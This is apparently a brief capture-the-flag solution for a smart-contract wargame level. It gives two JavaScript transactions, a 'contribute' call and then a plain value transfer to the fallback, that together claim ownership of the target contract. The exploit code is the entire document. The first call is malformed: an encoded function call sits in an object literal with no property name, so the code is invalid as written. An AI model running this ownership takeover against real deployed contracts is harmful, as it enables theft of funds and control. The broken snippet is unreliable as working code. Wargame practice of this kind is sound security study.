```javascript
await sendTransaction({
	from:player, 
	to:contract.address, 
	value:1, 
	web3.eth.abi.encodeFunctionCall({
	    name: 'contribute',
	    type: 'function',
	    inputs: []
	}, [])
});

await sendTransaction({from:player, to:contract.address, value:1})
```

Send the two transcations above and we can claim ownership of the contract.